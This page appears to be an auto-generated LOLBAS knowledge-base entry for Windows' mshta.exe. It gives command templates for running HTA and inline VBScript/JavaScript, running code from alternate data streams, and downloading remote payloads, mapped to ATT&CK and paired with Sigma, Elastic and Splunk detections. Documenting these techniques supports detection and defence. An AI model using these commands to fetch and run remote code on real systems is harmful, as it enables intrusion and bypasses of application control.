---
title: "Mshta.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Mshta.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Mshta.exe"
functions:
  - "Execute"
  - "ADS"
  - "Download"
attack_technique_ids:
  - "T1218.005"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used by Windows to execute html applications. (.hta)

## Paths

- `C:\Windows\System32\mshta.exe`
- `C:\Windows\SysWOW64\mshta.exe`

## Commands

### 1. Execute

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

```cmd
mshta.exe {PATH:.hta}
```

- Use Case: Execute code
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]

### 2. Execute

Executes VBScript supplied as a command line argument.

```cmd
mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
```

- Use Case: Execute code
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]

### 3. Execute

Executes JavaScript supplied as a command line argument.

```cmd
mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
```

- Use Case: Execute code
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]

### 4. ADS

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

```cmd
mshta.exe "{PATH_ABSOLUTE}:file.hta"
```

- Use Case: Execute code hidden in alternate data stream
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]

### 5. Download

It will download a remote payload and place it in INetCache.

```cmd
mshta.exe {REMOTEURL}
```

- Use Case: Downloads payload from remote server
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
- Elastic: https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: mshta.exe executing raw or obfuscated script within the command-line
- IOC: General usage of HTA file
- IOC: msthta.exe network connection to Internet/WWW resource
- IOC: DotNet CLR libraries loaded into mshta.exe
- IOC: DotNet CLR Usage Log - mshta.exe.log

## Resources

- {'Link': 'https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4'}
- {'Link': 'https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct'}
- {'Link': 'https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/'}
- {'Link': 'https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}
- {'Person': 'Nir Chako (Pentera)', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml)
